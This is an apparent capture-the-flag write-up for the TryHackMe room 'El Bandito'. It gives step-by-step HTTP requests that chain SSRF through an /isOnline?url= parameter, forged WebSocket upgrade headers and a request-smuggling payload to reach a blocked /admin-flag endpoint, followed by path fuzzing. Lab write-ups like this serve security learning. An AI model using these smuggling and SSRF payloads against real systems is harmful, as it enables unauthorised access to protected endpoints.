![Congrats](assets/screenshots/El%20Bandito/El%20Bandito%20congrats.jpg)

# EL BANDITO - CTF
**Room Link:** [El Bandito](https://tryhackme.com/room/elbandito)

**Difficulty:** Hard  
**Tools:** Burp, Python, Netcat

## STEP 1: Burp Setup
Add listener `127.0.0.1:8080`

## STEP 2: Test SSRF
```http
GET /isOnline?url=http://test.com
```
If 200 = good

## STEP 3: Add WebSocket headers
```http
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==
```

## STEP 4: Run Python server (101 response)
```bash
python3 server.py
```

## STEP 5: Smuggle two requests in Repeater
```http
GET /isOnline?url=http://YOUR_IP:8000/ws


GET /admin-flag
```

## STEP 6: Fuzzing for hidden endpoints
If `/admin-flag` returns 403 or 404, try:
- `/api/admin-flag`
- `/v1/admin-flag`
- `/internal/admin-flag`
- `/actuator/admin-flag`
- `/rest/admin-flag`

Use Burp Intruder to automate fuzzing

## STEP 7: Get flag
*(Flags have been replaced with images/screenshots where applicable)*

**Status Codes:**
- 403 = exists but blocked
- 404 = wrong path
- 500 = format error
